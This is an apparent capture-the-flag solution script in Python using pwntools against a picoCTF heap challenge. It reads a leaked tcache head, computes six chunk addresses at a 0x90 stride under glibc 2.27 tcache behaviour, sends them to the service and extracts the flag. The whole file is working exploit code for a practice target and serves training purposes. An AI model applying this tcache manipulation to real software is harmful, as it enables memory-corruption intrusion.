#!/usr/bin/env python3
from pwn import *
import sys

def solve(host=None, port=None):
    if host and port:
        io = remote(host, port)
        log.info(f"Connected to {host}:{port}")
    else:
        io = process('./heapedit_patched')
        log.info("Running local binary")
    
    # Read the tcache head address (chunks[0])
    line = io.recvline().decode().strip()
    log.info(f"Received: {line}")
    
    # Parse: "tcache head (start of free list) -> 0x..."
    head = int(line.split('-> ')[1].strip(), 16)
    log.success(f"Head (chunks[0]) = {hex(head)}")
    
    # In GLIBC 2.27 tcache (no safe-linking):
    # Chunks are allocated sequentially, each 0x90 bytes apart
    # Freed in reverse (5,4,3,2,1,0), so tcache list: 0->1->2->3->4->5->NULL
    # fd pointer at chunks[i] = chunks[i+1] (for i < 5), NULL for i=5
    
    chunk_stride = 0x90  # 0x80 data + 0x10 header
    
    for i in range(6):
        addr = head + i * chunk_stride
        prompt = io.recvuntil(b': ').decode()
        log.info(f"Chunk {i+1}: sending {hex(addr)}")
        io.sendline(hex(addr).encode())
    
    result = io.recvall(timeout=5).decode()
    log.success(f"Result: {result}")
    return result

if __name__ == '__main__':
    result = solve("candy-mountain.picoctf.net", 52993)
    
    # Extract flag
    if 'Flag:' in result:
        flag = result.split('Flag:')[1].strip()
        print(f"\n[FLAG] {flag}")